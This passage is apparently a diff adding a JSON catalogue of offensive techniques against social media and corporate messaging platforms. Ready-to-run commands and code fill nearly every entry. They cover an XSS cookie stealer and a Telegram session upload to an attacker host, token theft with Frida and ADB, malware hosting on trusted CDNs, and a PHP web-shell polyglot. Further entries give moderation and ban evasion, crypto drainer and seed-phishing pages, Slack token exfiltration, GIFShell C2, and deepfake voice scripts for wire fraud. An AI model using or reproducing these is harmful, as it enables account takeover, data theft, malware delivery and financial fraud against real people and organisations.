+        "command": "tar -czf telegram_session.tar.gz ~/.local/share/TelegramDesktop/tdata\ncurl -F 'file=@telegram_session.tar.gz' https://{attacker}/upload\n# Import on attacker machine: copy tdata folder to Telegram Desktop directory"
+      },
+      {
+        "description": "Steal Instagram session cookie from victim browser via XSS injection.",
+        "method": "JavaScript",
+        "command": "// Stored XSS payload:\n<script>fetch('https://{attacker}/steal?c='+encodeURIComponent(document.cookie))</script>\n// Or via BeEF hook for interactive session hijack"
+      },
+      {
+        "description": "OAuth token theft via redirect_uri manipulation in social login.",
+        "method": "Manual",
+        "command": "# Social login OAuth redirect exploit:\n# Normal: https://{app}/callback?code={auth_code}\n# Exploit: change redirect_uri to attacker:\n# https://www.facebook.com/dialog/oauth?client_id={app_id}&redirect_uri=https://attacker.com/capture&scope=email\n# Victim's browser delivers auth code to attacker"
+      },
+      {
+        "description": "Extract Twitter/X OAuth tokens from Android app via ADB on rooted device.",
+        "method": "ADB",
+        "command": "adb shell run-as com.twitter.android cat /data/data/com.twitter.android/shared_prefs/preferences.xml | grep -i 'auth_token\\|secret\\|bearer'\n# Or pull full prefs:\nadb pull /data/data/com.twitter.android/shared_prefs/ ./twitter_prefs/"
+      },
+      {
+        "description": "Instagram token extraction via Frida hook on Android \u2014 intercept Authorization header.",
+        "method": "Frida",
+        "command": "frida -U -f com.instagram.android --no-pause -l - <<'EOF'\nJava.perform(function() {\n  var OkHttp = Java.use('okhttp3.internal.http.RealInterceptorChain');\n  OkHttp.proceed.overload('okhttp3.Request','okhttp3.internal.http.HttpCodec','okhttp3.internal.connection.StreamAllocation').implementation = function(req, a, b) {\n    var auth = req.header('Authorization');\n    if (auth) console.log('[TOKEN]', auth);\n    return this.proceed(req, a, b);\n  };\n});\nEOF"
+      },
+      {
+        "description": "LinkedIn session cookie extraction via Chrome saved cookies database.",
+        "method": "Python",
+        "command": "import sqlite3, shutil, os\npath = os.path.expanduser('~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies')\nshutil.copy(path, 'cookies_copy.db')\nconn = sqlite3.connect('cookies_copy.db')\nfor row in conn.execute(\"SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%linkedin%'\"):\n    print(row)  # Decrypt with win32crypt for plaintext"
+      }
+    ],
+    "prerequisites": "Target social media account tokens accessible (phished OAuth, XSS, or client-side extraction); or credential attack successful",
+    "opsec": "OAuth token theft via open redirect or XSS \u2014 no password reset needed. Tokens stored in localStorage extractable via XSS. Active session tokens bypass 2FA.",
+    "detection_ref": "Platform anomalous login detection; token binding to device; OAuth token monitoring; session invalidation on device change"
+  },
+  "malware_distribution_via_social": {
+    "description": "Using social media platforms as malware delivery infrastructure \u2014 trusted CDN hosting, link embedding, and payload staging.",
+    "mitre": "T1608",
+    "commands": [
+      {
+        "description": "Host payload on GitHub releases \u2014 CDN URL often whitelisted by web filters.",
+        "method": "GitHub CLI",
+        "command": "gh release create v1.0 ./implant.exe --repo {attacker}/{repo} --title 'Update 1.0' --notes 'Bug fixes'\n# CDN URL: https://github.com/{attacker}/{repo}/releases/download/v1.0/implant.exe\n# github.com commonly whitelisted, bypasses URL filtering and content proxies"
+      },
+      {
+        "description": "Use Discord CDN to host payload \u2014 cdn.discordapp.com typically whitelisted.",
+        "method": "Python",
+        "command": "import requests\nwith open('payload.exe','rb') as f:\n    r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',\n        headers={'Authorization':'Bot {bot_token}'},\n        files={'file':('installer.exe', f, 'application/octet-stream')})\nprint(r.json()['attachments'][0]['url'])  # cdn.discordapp.com/..."
+      },
+      {
+        "description": "Host payload on Google Drive / OneDrive \u2014 trusted domains bypass AV and proxy.",
+        "method": "Manual",
+        "command": "# Google Drive direct download:\n# https://drive.google.com/uc?export=download&id={file_id}\n# OneDrive direct link:\n# https://onedrive.live.com/download?cid={cid}&resid={resid}&authkey={key}\n# Both domains: corporate-whitelisted, no SSL inspection in most orgs"
+      },
+      {
+        "description": "Deliver malware via Telegram bot \u2014 no link scanning, no URL preview filtering.",
+        "method": "Python",
+        "command": "import requests\nwith open('malware.exe','rb') as f:\n    requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument',\n        data={'chat_id':'{target_chat_id}'},\n        files={'document':('invoice.pdf.exe', f)})"
+      },
+      {
+        "description": "Create polyglot file \u2014 valid JPEG that executes as script when renamed.",
+        "method": "Shell",
+        "command": "# JPEG + PHP polyglot:\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' benign.jpg -o shell.jpg\n# JPEG + ZIP (contains executable):\ncat image.jpg payload.zip > polyglot.jpg\n# Post on social: appears as image, functions as exploit in misconfigured server"
+      },
+      {
+        "description": "YouTube channel malware distribution \u2014 fake tool in description via trusted redirect.",
+        "method": "Manual",
+        "command": "# 1. Create channel mimicking popular tech/gaming creator\n# 2. Upload tutorial: 'FREE Premium Tool 2025 (Working)'\n# 3. Description: 'Download: {lookalike_domain}.com/{tool}.exe'\n# 4. Pin comment as creator: same download link\n# 5. Payload: infostealer masquerading as cracked software\n# Lookalike domains: g1thub.com, micros0ft.com, githubb.io"
+      },
+      {
+        "description": "Instagram bio link swap to phishing page using stolen account credentials.",
+        "method": "curl",
+        "command": "curl -X POST 'https://graph.instagram.com/me' -d 'website={phishing_url}&access_token={stolen_token}'\n# Or via session:\ncurl 'https://www.instagram.com/accounts/edit/' -b '{session_cookie}' -d 'biography={bio}&website={phishing_url}'"
+      }
+    ],
+    "prerequisites": "Malware payload with delivery mechanism; social media account for distribution",
+    "opsec": "Host payload behind URL shortener or legitimate file share service to bypass link scanners. Use multi-stage delivery (lure doc \u2192 payload download).",
+    "detection_ref": "Platform malware scanning; URL reputation services; browser download protection; endpoint detection at execution"
+  },
+  "platform_specific_exploits": {
+    "description": "Platform-specific attack techniques \u2014 IDOR, logic flaws, API bugs, and misconfigurations on major social platforms.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Instagram \u2014 IDOR on story media endpoint to access private account content.",
+        "method": "Burp Suite",
+        "command": "# Intercept story reply, modify media owner ID to private account:\nPOST /api/v1/media/{private_media_id}/comment/ HTTP/1.1\nHost: i.instagram.com\nAuthorization: Bearer {your_token}\n# Test: increment/decrement media IDs to access adjacent private content"
+      },
+      {
+        "description": "Twitter/X \u2014 account existence enumeration via password reset endpoint.",
+        "method": "Python",
+        "command": "import requests, time\nfor user in open('wordlist.txt'):\n    r = requests.post('https://api.twitter.com/1.1/account/begin_password_reset.json',\n        data={'username': user.strip()},\n        headers={'Authorization': 'Bearer {bearer}'})\n    if 'email' in r.text.lower(): print('EXISTS:', user.strip())\n    time.sleep(1)"
+      },
+      {
+        "description": "LinkedIn \u2014 employee email discovery via Apollo.io and Hunter.io APIs.",
+        "method": "curl",
+        "command": "# Hunter.io:\ncurl 'https://api.hunter.io/v2/domain-search?domain={target_domain}&api_key={key}&limit=100'\n# Apollo.io:\ncurl 'https://api.apollo.io/v1/people/search' -H 'X-Api-Key: {key}' -d '{\"organization_domains\":[\"{domain}\"],\"per_page\":100}'"
+      },
+      {
+        "description": "Telegram \u2014 enumerate registered accounts by phone number via contact import.",
+        "method": "Python",
+        "command": "from telethon import TelegramClient, functions, types\nasync def check(phones):\n    async with TelegramClient('enum', {api_id}, '{api_hash}') as client:\n        result = await client(functions.contacts.ImportContactsRequest([\n            types.InputPhoneContact(client_id=i, phone=p, first_name=f'Test', last_name='')\n            for i, p in enumerate(phones)\n        ]))\n        for user in result.users:\n            print(f'{user.phone} -> @{user.username} | {user.first_name}')"
+      },
+      {
+        "description": "Discord \u2014 invite code brute force to discover private server links.",
+        "method": "Python",
+        "command": "import requests, string, itertools, time\nchars = string.ascii_letters + string.digits\nfor code in itertools.product(chars, repeat=6):\n    invite = ''.join(code)\n    r = requests.get(f'https://discord.com/api/v9/invites/{invite}?with_counts=true')\n    if r.status_code == 200:\n        d = r.json()\n        print(f'VALID: {invite} | {d[\"guild\"][\"name\"]} | {d[\"approximate_member_count\"]} members')\n    time.sleep(0.05)"
+      },
+      {
+        "description": "Snapchat \u2014 FindFriends phone number enumeration via API.",
+        "method": "curl",
+        "command": "curl -X POST 'https://feelinsonice-hrd.appspot.com/bq/find_friends' -H 'User-Agent: Snapchat/10.92.0.0 (Android)' -d 'username={user}&timestamp={epoch}&req_token={token}&numbers=[{phone1},{phone2}]'\n# Returns Snapchat usernames mapped to phone numbers"
+      },
+      {
+        "description": "TikTok \u2014 access video metadata via undocumented mobile API without auth.",
+        "method": "curl",
+        "command": "curl 'https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/feed/?aweme_id={video_id}&source_type=12&device_id={device_id}' -H 'User-Agent: com.zhiliaoapp.musically/2022600030 (Linux; Android 11)' | jq '.aweme_list[0] | {desc,author,statistics}"
+      },
+      {
+        "description": "Facebook \u2014 extract phone numbers from batch user lookup API.",
+        "method": "curl",
+        "command": "curl 'https://graph.facebook.com/v18.0/?ids={uid1},{uid2},{uid3}&fields=name,phone,email&access_token={token}'\n# Returns PII for each UID if privacy settings allow"
+      }
+    ],
+    "prerequisites": "Target social platform; known vulnerability or misconfiguration; platform API access",
+    "opsec": "Platform-specific vulnerabilities (API misconfigurations, oauth flaws) have short windows before patching. Document and report (if ethical) or exploit quickly.",
+    "detection_ref": "Platform security reporting programs; API abuse monitoring; rate limiting; platform security team detection"
+  },
+  "social_media_evasion_bypass": {
+    "description": "Bypassing platform moderation, AI content detection, automated bans, shadowbans, trust-and-safety systems, and device fingerprinting.",
+    "mitre": "T1564",
+    "commands": [
+      {
+        "description": "Detect if account is shadowbanned on Twitter/X and diagnose ban type.",
+        "method": "Python",
+        "command": "import requests\nr = requests.get('https://shadowban.eu/api/{username}')\nprint(r.json())  # Returns: search_ban, reply_deboosting, ghost_ban, search_suggestion_ban\n# Recovery: stop rapid follow/unfollow, reduce hashtag density, increase engagement"
+      },
+      {
+        "description": "Instagram ban evasion \u2014 full device and identity reset protocol.",
+        "method": "Manual",
+        "command": "# Full evasion checklist after ban:\n# 1. Uninstall app, clear all app data\n# 2. New residential IP (mobile data or rotating proxy)\n# 3. New phone number via SMS-Activate\n# 4. New email not linked to banned account\n# 5. New device fingerprint (factory reset or new device)\n# 6. Wait 48 hours minimum between attempts\n# 7. NEVER access old account from new device/session"
+      },
+      {
+        "description": "Bypass Twitter automated spam detection with human behavior simulation.",
+        "method": "Python",
+        "command": "import time, random\ndef post_safe(api, text):\n    hour = time.gmtime().tm_hour\n    if not (8 <= hour <= 22): return  # only post in human hours\n    time.sleep(random.gauss(3600, 900))  # gaussian distribution ~1hr avg\n    api.update_status(text)\n# Post mix: 40% retweets, 30% likes, 20% replies, 10% original content"
+      },
+      {
+        "description": "Evade platform AI text moderation using Unicode homoglyphs and zero-width chars.",
+        "method": "Python",
+        "command": "text = '{policy_violating_text}'\n# Homoglyph substitution (Cyrillic lookalikes \u2014 visually identical):\nperturbed = text.replace('a','\\u0430').replace('e','\\u0435').replace('o','\\u043e').replace('c','\\u0441')\n# Zero-width character injection:\nperturbed = '\\u200b'.join(list(text))  # invisible to humans, breaks classifier tokens\n# Invisible Unicode suffix:\nperturbed = text + '\\u2063\\u2064'"
+      },
+      {
+        "description": "Evade image AI content classifiers with imperceptible adversarial noise.",
+        "method": "Python",
+        "command": "import torch\nfrom torchvision import transforms\nfrom PIL import Image\nimg = transforms.ToTensor()(Image.open('{flagged.jpg}')).unsqueeze(0)\nnoise = torch.randn_like(img) * 0.008  # imperceptible to human eye\nadv = (img + noise).clamp(0,1)\ntransforms.ToPILImage()(adv.squeeze()).save('clean_looking.jpg')"
+      },
+      {
+        "description": "Bypass social platform URL scanners using trusted-domain redirect chains.",
+        "method": "Manual",
+        "command": "# Redirect chain to evade URL scanning:\n# 1. Google AMP proxy: https://www.google.com/amp/s/{phish_domain}\n# 2. Google Translate: https://translate.google.com/translate?u={phish_url}\n# 3. YouTube redirect: https://www.youtube.com/redirect?q={phish_url}\n# 4. GitHub redirect: https://github.com/{user}/{repo}/raw/main/{file} -> redirects\n# 5. Time-gate: serve legit content to scanner IPs for 24-48hr, then swap"
+      },
+      {
+        "description": "Evade Coordinated Inauthentic Behavior (CIB) detection on Facebook/Twitter.",
+        "method": "Manual",
+        "command": "# CIB detection evasion:\n# 1. Never post identical content \u2014 introduce synonyms and paraphrasing\n# 2. Stagger posts: 2-6 hour gaps between accounts on same narrative\n# 3. Use different hashtags and image variants per account\n# 4. Mandatory: unique residential IP per account cluster\n# 5. Account warm-up: 30+ days of organic behavior before operation\n# 6. Content mix: 70% genuine interest, 30% influence content\n# 7. Unique AI-generated face per account \u2014 never reuse images"
+      },
+      {
+        "description": "Bypass Reddit shadowban and karma manipulation detection.",
+        "method": "Python",
+        "command": "# Reddit evasion strategy:\n# 1. Build karma to 100+ before posting in restricted subreddits (7+ day warm-up)\n# 2. Comment on non-controversial posts daily for credibility\n# 3. Never vote from same IP as account creation\n# 4. Space votes: max 30/hour with gaussian delay between each\n# 5. Use different subreddits per controlled account\n# 6. Check shadowban: curl 'https://reddit.com/user/{name}/about.json' | jq '.data.is_suspended'"
+      },
+      {
+        "description": "Bypass Discord phone verification for account creation using virtual number API.",
+        "method": "Python",
+        "command": "import requests\n# Get number: GET https://api.sms-activate.org/?action=getNumber&service=dc&country=6\nphone = '{phone_from_api}'\n# Submit to Discord:\nrequests.patch('https://discord.com/api/v9/users/@me/phone',\n    headers={'Authorization':'{discord_token}'},\n    json={'phone': phone, 'change_phone_reason': 'user_action'})\n# Get OTP: ?action=getStatus&id={activation_id}"
+      }
+    ],
+    "prerequisites": "Suspended or restricted account; evasion technique applicable",
+    "opsec": "Evade platform detection via fresh accounts, residential proxies, device fingerprint rotation, and natural posting behavior. Avoid triggering anti-spam ML.",
+    "detection_ref": "Platform ML detection for inauthentic behavior; device fingerprinting; residential proxy detection; coordinated behavior analysis"
+  },
+  "crypto_nft_web3_social_scams": {
+    "description": "Social media-based cryptocurrency, NFT, and Web3 fraud techniques \u2014 giveaway scams, wallet drainers, pig butchering, and fake exchanges.",
+    "mitre": "T1657",
+    "commands": [
+      {
+        "description": "Twitter/X crypto giveaway scam \u2014 impersonate verified influencer.",
+        "method": "Manual",
+        "command": "# Setup:\n# 1. Buy Twitter Blue for blue checkmark or use verified-looking handle\n# 2. Change display name to '{Target_Influencer}' temporarily\n# 3. Reply to real influencer tweet: 'Celebrating 1M followers! Sending 1 ETH to 10 fans! Send 0.1 to verify: {attacker_wallet}'\n# 4. Buy boosted placement on reply thread for visibility\n# 5. Amplify with 50+ sockpuppets quoting and retweeting"
+      },
+      {
+        "description": "NFT Discord wallet drainer \u2014 fake mint event via compromised/cloned server.",
+        "method": "Manual",
+        "command": "# Drainer deployment:\n# 1. Compromise admin account or create cloned server\n# 2. Bot posts: 'SURPRISE MINT \u2014 Free NFT for next 30 minutes only! Limited 500 slots!'\n# 3. Link -> site calls setApprovalForAll({attacker}, true) disguised as minting\n# 4. Once approved, drain all NFTs and tokens automatically\n# Tools: Pink Drainer, Angel Drainer, Venom Drainer (underground markets)\n# Typical take: $10k-$500k per campaign"
+      },
+      {
+        "description": "Instagram pig butchering (sha zhu pan) operation setup.",
+        "method": "Manual",
+        "command": "# Multi-week fraud pipeline:\n# Week 1-2: Glamorous AI persona (luxury, crypto wealth, travel lifestyle)\n# Week 3-4: Contact via DM or dating app 'wrong number' opener\n# Week 5-8: Build genuine relationship, introduce 'trading platform'\n# Week 9+: Target deposits small amount, sees 'gains' (fake platform backend)\n# Escalate: 'my uncle's fund is up 300% this week!'\n# Exit: block withdrawal (taxes/fees), or platform 'goes offline'\n# Infrastructure: clone real exchange UI, control backend P&L display"
+      },
+      {
+        "description": "MetaMask seed phrase phishing page \u2014 clone wallet recovery UI.",
+        "method": "PHP",
+        "command": "<?php\n// Capture seed phrase from fake MetaMask recovery page:\n$seed = $_POST['seed_phrase'];\nfile_put_contents('seeds.txt', $seed . PHP_EOL, FILE_APPEND);\nmail('{attacker_email}', 'New Seed', $seed);\nheader('Location: https://metamask.io');\n?>\n# Distribute via: Twitter DM ('MetaMask Support'), Discord bot, Telegram support channel"
+      },
+      {
+        "description": "Telegram crypto pump-and-dump signal channel operation.",
+        "method": "Manual",
+        "command": "# P&D operation:\n# 1. Buy target altcoin ($1M-$5M market cap)\n# 2. Create Telegram channel, buy 10k+ fake members from panel service\n# 3. Build trust over 2-4 weeks with 'accurate' signals (price after purchase)\n# 4. Signal post: '{COIN}/BTC \u2014 500% gain incoming! Exchange insider tip. BUY NOW'\n# 5. Real traders buy, price pumps 20-100%\n# 6. Dump entire position at peak within 10-30 minutes\n# 7. Channel goes silent, admin disappears"
+      },
+      {
+        "description": "Fake OpenSea offer \u2014 social engineer NFT owner to sign malicious transaction.",
+        "method": "Manual",
+        "command": "# Attack flow:\n# 1. Contact NFT owner via Twitter/Discord: 'I made a 10 ETH offer on your listing'\n# 2. Link to clone: opensee.io, opensea-nft.io, opensea-official.com\n# 3. Victim connects wallet to 'view offer'\n# 4. Site requests seaport signature \u2014 actually safeTransferFrom to attacker\n# 5. NFT transferred with single off-chain signature (no gas fee warning for victim)"
+      }
+    ],
+    "prerequisites": "Crypto wallet addresses to target; social platform presence; scam infrastructure",
+    "opsec": "Crypto scams via social media: fake giveaways, rug pulls, honeypot tokens. Discord and Telegram for targeted crypto community attacks.",
+    "detection_ref": "Blockchain analytics for scam address tracking; platform reporting for crypto scams; wallet address reputation monitoring; smart contract auditing"
+  },
+  "slack_teams_corporate_messaging": {
+    "description": "Offensive techniques targeting corporate messaging platforms \u2014 Slack and Microsoft Teams \u2014 for initial access, lateral movement, credential theft, and data exfiltration.",
+    "mitre": "T1534",
+    "commands": [
+      {
+        "description": "Enumerate public Slack workspaces for a target org using subdomain bruteforce.",
+        "method": "Python",
+        "command": "import requests\ncompany = '{target_company}'\nfor word in open('workspace_names.txt'):\n    workspace = f'{company}{word.strip()}'\n    r = requests.get(f'https://{workspace}.slack.com/api/api.test')\n    if r.status_code == 200:\n        print(f'[FOUND] {workspace}.slack.com')"
+      },
+      {
+        "description": "Harvest Slack tokens from browser localStorage after compromising endpoint.",
+        "method": "Bash",
+        "command": "# Chrome Slack token extraction (Windows):\nfind 'C:/Users/*/AppData/Local/slack/storage/root-state.json' -exec grep -o '\"token\":\"xoxc-[^\"]*\"' {} \\;\n# Firefox:\nfind ~/.mozilla -name '*.sqlite' -exec sqlite3 {} \"SELECT value FROM webappsstore2 WHERE key LIKE '%slack%token%'\" \\;"
+      },
+      {
+        "description": "Use stolen Slack xoxc token to enumerate workspace users, channels, and files.",
+        "method": "Python",
+        "command": "import requests\ntoken = '{xoxc_or_xoxs_token}'\nheaders = {'Authorization': f'Bearer {token}'}\n# List users:\nusers = requests.get('https://slack.com/api/users.list', headers=headers).json()\n# List channels:\nchans = requests.get('https://slack.com/api/conversations.list?types=private_channel,public_channel', headers=headers).json()\n# Search for secrets:\nsearch = requests.get('https://slack.com/api/search.messages?query=password+OR+apikey+OR+secret', headers=headers).json()\nprint(search['messages']['matches'])"
+      },
+      {
+        "description": "Exfiltrate files from Slack channels using API with stolen token.",
+        "method": "Python",
+        "command": "import requests\ntoken = '{xoxc_token}'\n# List all files shared in workspace:\nr = requests.get('https://slack.com/api/files.list?count=100', headers={'Authorization': f'Bearer {token}'}).json()\nfor f in r['files']:\n    url = f['url_private_download']\n    content = requests.get(url, headers={'Authorization': f'Bearer {token}'}).content\n    open(f['name'], 'wb').write(content)\n    print(f'[+] Downloaded: {f[\"name\"]}'})"
+      },
+      {
+        "description": "Post malicious link in Slack channel impersonating IT \u2014 credential phishing.",
+        "method": "Python",
+        "command": "import requests\ntoken = '{xoxb_bot_token}'\nchannel = '{channel_id}'\n# Post as bot with deceptive name:\nrequests.post('https://slack.com/api/chat.postMessage', headers={'Authorization': f'Bearer {token}'},\n    json={'channel': channel, 'username': 'IT-HelpDesk', 'icon_emoji': ':computer:',\n          'text': ':rotating_light: ACTION REQUIRED: Mandatory SSO re-authentication by EOD. Click here: {phish_link}'})"
+      },
+      {
+        "description": "Microsoft Teams \u2014 enumerate users and send phishing via external guest access.",
+        "method": "PowerShell",
+        "command": "# Enumerate Teams users via Graph API:\n$token = '{entra_access_token}'\n$headers = @{'Authorization' = \"Bearer $token\"}\n$users = Invoke-RestMethod 'https://graph.microsoft.com/v1.0/users?$select=displayName,mail,jobTitle' -Headers $headers\n$users.value | Export-Csv teams_users.csv -NoTypeInformation\n# Send Teams message to external user:\nInvoke-RestMethod 'https://graph.microsoft.com/v1.0/chats/{chat_id}/messages' -Method POST -Headers $headers -Body (@{body=@{content='{phish_link}'}} | ConvertTo-Json)"
+      },
+      {
+        "description": "Teams GIFShell \u2014 exfiltrate data via Teams GIF rendering without triggering DLP.",
+        "method": "Python",
+        "command": "# GIFShell technique \u2014 C2 over Microsoft Teams GIF responses:\n# 1. Attacker sends GIF to target via Teams\n# 2. Teams fetches GIF from attacker server, appending victim info in User-Agent\n# 3. Exfiltrate command output as animated GIF filenames\n# Server side:\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/gif/<path:cmd_output>')\ndef recv(cmd_output):\n    print(f'[EXFIL] {cmd_output}')\n    return open('beacon.gif','rb').read(), 200, {'Content-Type':'image/gif'}\n# Client-side stager on victim: runs command, embeds output in GIF URL Teams fetches"
+      },
+      {
+        "description": "Slack webhook abuse \u2014 exfiltrate data to attacker via misconfigured webhook URLs.",
+        "method": "Python",
+        "command": "# Find exposed Slack webhook URLs in code/configs:\n# grep -r 'hooks.slack.com/services' /path/to/repo\n# Test webhook:\nimport requests\nwebhook = 'https://hooks.slack.com/services/{T}/{B}/{token}'\nrequests.post(webhook, json={'text': 'Webhook alive \u2014 data follows', 'attachments':[{'text': '{stolen_data}'}]})\n# Abuse: send stolen credentials/files to attacker-controlled Slack channel via org webhook"
+      }
+    ],
+    "prerequisites": "Access to target Slack workspace or Teams tenant; user account or token",
+    "opsec": "Slack tokens in web browser localStorage. Teams tokens harvestable via memory scraping or OAuth phishing. Message search reveals sensitive data.",
+    "detection_ref": "Slack audit logs; Teams compliance recording; DLP policies for sensitive content in messages; token rotation and expiry"
+  },
+  "ai_deepfake_social_engineering": {
+    "description": "AI-powered deepfake video, voice cloning, and synthetic identity techniques for social engineering, BEC fraud, and impersonation attacks.",
+    "mitre": "T1656",
+    "commands": [
+      {
+        "description": "Clone target executive voice from public audio samples for vishing/BEC.",
+        "method": "Python",
+        "command": "# ElevenLabs voice cloning from public speech:\n# 1. Collect 30-60 seconds of clean target audio (earnings call, conference talk, YouTube interview)\npython3 -c \"\nimport requests\nwith open('exec_audio.mp3','rb') as f:\n    r = requests.post('https://api.elevenlabs.io/v1/voices/add',\n        headers={'xi-api-key': '{api_key}'},\n        data={'name': 'Target Clone'},\n        files={'files': f})\nprint(r.json()['voice_id'])\n\"\n# Generate audio: POST /v1/text-to-speech/{voice_id} with malicious script"
+      },
+      {
+        "description": "Real-time voice changer for live vishing calls impersonating executive.",
+        "method": "Bash",
+        "command": "# RVC (Retrieval-based Voice Conversion) for real-time impersonation:\n# Requirements: RVC WebUI, trained voice model from target samples\npython3 infer-web.py --pycmd python --port 7865\n# Route microphone through RVC pipeline:\n# Input: attacker mic -> RVC model (target voice) -> VoIP/phone output\n# Tools: voice.ai, Voicemod with AI voices, RVC-Project, so-vits-svc\n# Use case: call CFO impersonating CEO, authorize wire transfer"
+      },
+      {
+        "description": "Generate deepfake video of executive for LinkedIn/social media impersonation.",
+        "method": "Python",
+        "command": "# Wav2Lip \u2014 lip sync deepfake on target face with attacker audio:\npython3 inference.py --checkpoint_path wav2lip_gan.pth \\\n  --face {target_face_video.mp4} \\\n  --audio {attacker_script.wav} \\\n  --outfile deepfake_exec.mp4\n# Alternative: D-ID, HeyGen, Synthesia (commercial APIs) with stolen photo\n# Use case: fake CEO announcement video for BEC or stock manipulation"
+      },
+      {
+        "description": "AI-generated synthetic identity for fake LinkedIn executive profile creation.",
+        "method": "Python",
+        "command": "# Generate consistent synthetic person across platforms:\n# 1. Face: thispersondoesnotexist.com API or StyleGAN2\npython3 -c \"\nimport requests\nr = requests.get('https://thispersondoesnotexist.com/')\nopen('fake_face.jpg','wb').write(r.content)\n\"\n# 2. Name + background: ChatGPT prompt for consistent persona story\n# 3. Voice: ElevenLabs generated voice for audio verification\n# 4. Work history: LinkedIn with fake company + endorsements from other fake profiles\n# 5. Profile aging: gradually add connections, posts, recommendations over 30 days"
+      },
+      {
+        "description": "Deepfake video call \u2014 real-time face swap for Microsoft Teams/Zoom fraud.",
+        "method": "Bash",
+        "command": "# DeepFaceLive \u2014 real-time face swap for video calls:\ngit clone https://github.com/iperov/DeepFaceLive\n# Setup virtual camera (OBS VirtualCam):\n# 1. Run DeepFaceLive with target executive face model\n# 2. Output to OBS virtual camera\n# 3. Select virtual camera in Teams/Zoom as video input\n# Use case: fraudulent video call to Finance team to authorize BEC transfer\n# Limitation: requires target face model (trained from ~100+ photos)"
+      },
+      {
+        "description": "Voice clone audio deepfake for voicemail BEC fraud.",
+        "method": "Python",
+        "command": "# Generate voicemail in CEO voice authorizing wire transfer:\nimport requests\nscript = 'Hi {CFO_name}, it is {CEO_name}. I am in an urgent board meeting. Please process the {amount} wire transfer to {account} immediately. I will explain later. Thanks.'\nr = requests.post(f'https://api.elevenlabs.io/v1/text-to-speech/{cloned_voice_id}',\n    headers={'xi-api-key': '{api_key}', 'Content-Type': 'application/json'},\n    json={'text': script, 'model_id': 'eleven_multilingual_v2',\n          'voice_settings': {'stability': 0.75, 'similarity_boost': 0.85}})\nopen('ceo_voicemail.mp3','wb').write(r.content)"
+      },
+      {
+        "description": "Detect if target uses AI detection tools \u2014 then tune deepfake to evade.",
+        "method": "Python",
+        "command": "# Test deepfake against common detectors before deployment:\nimport requests\nwith open('deepfake.jpg','rb') as f:\n    # Microsoft Azure Video Indexer:\n    r1 = requests.post('https://api.videoindexer.ai/detect', files={'file': f})\n    # Deepware Scanner API:\n    r2 = requests.post('https://api.deepware.ai/detect', files={'file': f})\n    print(r1.json(), r2.json())\n# If detected: reduce frame rate artifacts, add natural head movement, re-compress through WhatsApp/Teams"
+      }
+    ],
+    "prerequisites": "Voice/video samples of target persona; deepfake generation tooling; delivery platform",
+    "opsec": "AI-generated content for social engineering: fake CEO video for wire transfer approval, voice deepfake for vishing. Quality is rapidly improving.",
+    "detection_ref": "Deepfake detection tools; digital watermarking; C2PA content authenticity initiative; callback verification procedures; employee deepfake awareness training"
+  },
+  "linkedin_corporate_recon": {
+    "description": "LinkedIn-specific offensive recon and exploitation \u2014 Sales Navigator abuse, employee enumeration, infrastructure fingerprinting, and supply chain targeting.",
+    "mitre": "T1591.004",
+    "commands": [
+      {
+        "description": "LinkedIn Sales Navigator API abuse \u2014 extract full employee list for target org.",
+        "method": "Python",
+        "command": "import requests\n# Using Sales Navigator search API with valid subscription:\nheaders = {'Authorization': 'Bearer {linkedin_access_token}', 'X-RestLi-Protocol-Version': '2.0.0'}\n# Search all employees at target company:\nr = requests.get('https://api.linkedin.com/v2/search?q=people&facetCurrentCompany={company_id}&count=49&start=0', headers=headers)\n# Iterate pages to dump all employees:\nfor start in range(0, 5000, 49):\n    r = requests.get(f'https://api.linkedin.com/v2/search?q=people&facetCurrentCompany={company_id}&count=49&start={start}', headers=headers)\n    print(r.json())"
+      },
+      {
+        "description": "Enumerate technology stack from LinkedIn job postings \u2014 identify tools, versions, cloud providers.",
+        "method": "Python",
+        "command": "import requests\n# Scrape job postings for target org:\nheaders = {'User-Agent': 'Mozilla/5.0'}\nr = requests.get(f'https://www.linkedin.com/jobs/search/?keywords={target_company}&location=', headers=headers)\n# Extract tech stack intel from job descriptions:\nimport re\njob_html = r.text\n# Look for: AWS/Azure/GCP, Kubernetes, Terraform, Splunk, CrowdStrike, Okta, Palo Alto, etc.\ntech_keywords = re.findall(r'(AWS|Azure|GCP|Kubernetes|Terraform|Splunk|CrowdStrike|Okta|Palo Alto|Zscaler|Cisco|FortiGate|SentinelOne)', job_html)\nprint(set(tech_keywords))"
+      },
+      {
+        "description": "Identify contractors and third-party vendors with access to target environment.",
+        "method": "Python",
+        "command": "import requests\n# Search LinkedIn for contractors/consultants at target:\n# 1. Search 'past company: {target} current: {consulting_firm}' for ex-employees at MSPs\n# 2. Identify current contractors from job title: 'Contractor at {target}'\n# 3. Supply chain targeting: MSP/MSSP employees with target access\n# Tool: LinkedInt or Phantombuster LinkedIn scraper\nimport subprocess\nsubprocess.run(['python3','LinkedInt.py','-u','{target_company}','--employees','--contractors'])"
+      },
+      {
+        "description": "LinkedIn connection phishing \u2014 build rapport then deliver phishing link via InMail.",
+        "method": "Manual",
+        "command": "# LinkedIn spear phishing chain:\n# Day 1: Connect with target using shared connection or industry hook\n# Day 3: Like 2-3 of their posts (builds familiarity)\n# Day 5: InMail: 'Hi {name}, saw your work on {relevant_project}. We have a relevant whitepaper/tool your team might find useful: {phish_link}'\n# Pretext options:\n# - Industry benchmark report\n# - Job opportunity (salary survey)\n# - Shared conference material\n# - LinkedIn Learning course invite with SSO\n# Track opens: use unique tracking pixel per target"
+      },
+      {
+        "description": "Extract org structure from LinkedIn for BEC pretext \u2014 identify reporting lines.",
+        "method": "Python",
+        "command": "# Map org hierarchy for BEC targeting:\n# 1. Search LinkedIn: company employees with title 'VP Finance', 'CFO', 'Controller'\n# 2. Search for: 'Director of IT Security', 'CISO' to identify security team\n# 3. Find accounts payable contacts: 'AP Analyst', 'Accounts Payable'\n# 4. Identify IT admins: 'Systems Administrator', 'Azure Administrator'\n# Tool: linkedin2username for bulk username generation for spray:\n# python3 linkedin2username.py -u {your_li_account} -c {target_company}"
+      },
+      {
